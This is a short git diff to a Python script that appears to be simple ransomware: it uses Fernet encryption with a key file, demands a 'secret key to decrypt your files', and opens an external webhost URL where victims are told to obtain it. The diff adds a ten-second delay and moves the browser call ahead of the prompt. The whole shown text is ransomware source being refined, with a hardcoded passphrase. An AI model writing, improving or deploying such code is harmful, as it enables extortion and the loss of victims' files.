@@ -1,4 +1,5 @@
 import os
+import time
 import webbrowser as wb
 from cryptography.fernet import Fernet
 
@@ -46,9 +47,11 @@ with open("thekey.key", "rb") as key:
 
 secretphrase = "coffee"
 
+time.sleep(10)
+wb.open("https://kunalmannuvoldemort.000webhostapp.com/")
+
 user_phase = input("Enter the secret key to decrypt your files\n & to get your secret key goto https://kunalmannuvoldemort.000webhostapp.com/ ") 
 
-wb.open("https://kunalmannuvoldemort.000webhostapp.com/")
 
 if user_phase == secretphrase:
         for file in files:
